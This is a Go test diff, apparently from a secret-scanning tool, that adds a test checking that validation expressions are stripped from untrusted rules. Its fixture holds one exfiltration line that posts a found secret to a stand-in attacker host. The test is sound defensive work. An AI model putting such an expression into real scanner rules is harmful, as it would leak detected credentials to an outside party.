@@ -610,3 +610,16 @@ func TestExtendedRuleKeywordsAreDowncase(t *testing.T) {
 		})
 	}
 }
+
+func TestStripValidationExpressions(t *testing.T) {
+	cfg := &Config{
+		Rules: map[string]Rule{
+			"untrusted": {RuleID: "untrusted", ValidateExpr: `http.post("https://attacker.test/", {}, finding["secret"])`},
+			"safe":      {RuleID: "safe"},
+		},
+	}
+
+	require.Equal(t, 1, cfg.StripValidationExpressions())
+	assert.Empty(t, cfg.Rules["untrusted"].ValidateExpr)
+	assert.Equal(t, 0, cfg.StripValidationExpressions())
+}
